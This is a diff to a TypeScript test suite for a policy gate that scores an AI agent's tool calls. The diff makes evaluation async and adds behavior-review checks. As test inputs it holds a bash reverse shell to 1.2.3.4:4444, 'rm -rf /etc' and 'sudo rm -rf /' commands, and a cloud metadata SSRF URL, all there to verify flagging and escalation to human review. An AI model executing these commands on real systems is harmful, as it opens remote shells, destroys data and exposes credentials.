@@ -10,8 +10,8 @@ describe('PolicyGate', () => {
   });
 
   describe('evaluate', () => {
-    it('should approve safe read operations', () => {
-      const verdict = gate.evaluate({
+    it('should approve safe read operations', async () => {
+      const verdict = await gate.evaluate({
         correlationId: 'c1',
         toolName: 'read',
         toolInput: { path: '/workspace/src/index.ts' },
@@ -20,8 +20,8 @@ describe('PolicyGate', () => {
       expect(verdict.riskScore).toBeLessThanOrEqual(30);
     });
 
-    it('should escalate reverse shell attempts to HITL instead of auto-rejecting them', () => {
-      const verdict = gate.evaluate({
+    it('should escalate reverse shell attempts to HITL instead of auto-rejecting them', async () => {
+      const verdict = await gate.evaluate({
         correlationId: 'c2',
         toolName: 'exec',
         toolInput: { command: 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1' },
@@ -30,8 +30,8 @@ describe('PolicyGate', () => {
       expect(verdict.riskScore).toBeGreaterThan(90);
     });
 
-    it('should flag destructive rm for HITL', () => {
-      const verdict = gate.evaluate({
+    it('should flag destructive rm for HITL', async () => {
+      const verdict = await gate.evaluate({
         correlationId: 'c3',
         toolName: 'exec',
         toolInput: { command: 'rm -rf /etc' },
@@ -40,8 +40,8 @@ describe('PolicyGate', () => {
       expect(verdict.riskScore).toBeGreaterThanOrEqual(70);
     });
 
-    it('should approve normal exec commands', () => {
-      const verdict = gate.evaluate({
+    it('should approve normal exec commands', async () => {
+      const verdict = await gate.evaluate({
         correlationId: 'c4',
         toolName: 'exec',
         toolInput: { command: 'ls -la /workspace' },
@@ -49,8 +49,8 @@ describe('PolicyGate', () => {
       expect(verdict.verdict).toBe('approve');
     });
 
-    it('should flag SSRF attempts', () => {
-      const verdict = gate.evaluate({
+    it('should flag SSRF attempts', async () => {
+      const verdict = await gate.evaluate({
         correlationId: 'c5',
         toolName: 'web_fetch',
         toolInput: { url: 'http://169.254.169.254/latest/meta-data/' },
@@ -58,8 +58,8 @@ describe('PolicyGate', () => {
       expect(verdict.riskScore).toBeGreaterThanOrEqual(70);
     });
 
-    it('should approve loopback browser navigation inside the sandbox VM', () => {
-      const verdict = gate.evaluate({
+    it('should approve loopback browser navigation inside the sandbox VM', async () => {
+      const verdict = await gate.evaluate({
         correlationId: 'c5-browser',
         toolName: 'browser',
         toolInput: { action: 'navigate', url: 'http://127.0.0.1:8765/report.html' },
@@ -68,8 +68,8 @@ describe('PolicyGate', () => {
       expect(verdict.riskScore).toBeLessThanOrEqual(30);
     });
 
-    it('should reject disabled gateway tool calls', () => {
-      const verdict = gate.evaluate({
+    it('should reject disabled gateway tool calls', async () => {
+      const verdict = await gate.evaluate({
         correlationId: 'c6',
         toolName: 'gateway',
         toolInput: { action: 'restart' },
@@ -79,8 +79,8 @@ describe('PolicyGate', () => {
       expect(verdict.triggeredRules).toContain('boundary:disabled_tool');
     });
 
-    it('should keep high-risk sandbox-local tools available for approval workflows', () => {
-      const verdict = gate.evaluate({
+    it('should keep high-risk sandbox-local tools available for approval workflows', async () => {
+      const verdict = await gate.evaluate({
         correlationId: 'c7',
         toolName: 'write',
         toolInput: { path: '/etc/hosts', content: '127.0.0.1 localhost' },
@@ -92,21 +92,21 @@ describe('PolicyGate', () => {
   });
 
   describe('trust decay', () => {
-    it('should decrease trust score on anomalies', () => {
+    it('should decrease trust score on anomalies', async () => {
       const initial = gate.getTrustProfile();
       expect(initial.score).toBe(100);
 
       // Trigger anomalies
-      gate.evaluate({ correlationId: 'c1', toolName: 'exec', toolInput: { command: 'sudo rm -rf /' } });
+      await gate.evaluate({ correlationId: 'c1', toolName: 'exec', toolInput: { command: 'sudo rm -rf /' } });
       const after = gate.getTrustProfile();
       expect(after.score).toBeLessThan(100);
       expect(after.anomalyCount).toBeGreaterThan(0);
     });
 
-    it('should increase penalty boost when trust is low', () => {
+    it('should increase penalty boost when trust is low', async () => {
       // Trigger many anomalies to drop trust below 60
       for (let i = 0; i < 10; i++) {
-        gate.evaluate({ correlationId: `c${i}`, toolName: 'exec', toolInput: { command: 'sudo rm -rf /' } });
+        await gate.evaluate({ correlationId: `c${i}`, toolName: 'exec', toolInput: { command: 'sudo rm -rf /' } });
       }
       const profile = gate.getTrustProfile();
       expect(profile.penaltyBoost).toBeGreaterThan(0);
@@ -114,8 +114,8 @@ describe('PolicyGate', () => {
   });
 
   describe('reset', () => {
-    it('should reset trust profile', () => {
-      gate.evaluate({ correlationId: 'c1', toolName: 'exec', toolInput: { command: 'sudo rm -rf /' } });
+    it('should reset trust profile', async () => {
+      await gate.evaluate({ correlationId: 'c1', toolName: 'exec', toolInput: { command: 'sudo rm -rf /' } });
       gate.reset();
       const profile = gate.getTrustProfile();
       expect(profile.score).toBe(100);
@@ -123,11 +123,14 @@ describe('PolicyGate', () => {
       expect(profile.penaltyBoost).toBe(0);
     });
 
-    it('should delegate to an injected behavior analyzer provider', () => {
+    it('should delegate to an injected behavior analyzer provider', async () => {
       const analyzer: BehaviorAnalyzerProvider = {
         evaluate: vi.fn().mockReturnValue({
           riskBoost: 35,
           triggered: ['custom:review-required'],
+          reason: 'semantic drift detected',
+          confidence: 0.88,
+          source: 'ollama:qwen3:0.6b',
         }),
         reset: vi.fn(),
       };
@@ -137,7 +140,7 @@ describe('PolicyGate', () => {
         behaviorAnalyzer: analyzer,
       });
 
-      const verdict = injectedGate.evaluate({
+      const verdict = await injectedGate.evaluate({
         correlationId: 'c-custom',
         toolName: 'write',
         toolInput: { path: '/workspace/notes.txt', content: 'hello' },
@@ -145,6 +148,14 @@ describe('PolicyGate', () => {
 
       expect(analyzer.evaluate).toHaveBeenCalledOnce();
       expect(verdict.triggeredRules).toContain('custom:review-required');
+      expect(verdict.behaviorReview).toMatchObject({
+        riskBoost: 35,
+        triggered: ['custom:review-required'],
+        reason: 'semantic drift detected',
+        confidence: 0.88,
+        source: 'ollama:qwen3:0.6b',
+      });
+      expect(verdict.riskBreakdown?.behavior).toBe(35);
 
       injectedGate.reset();
       expect(analyzer.reset).toHaveBeenCalledOnce();
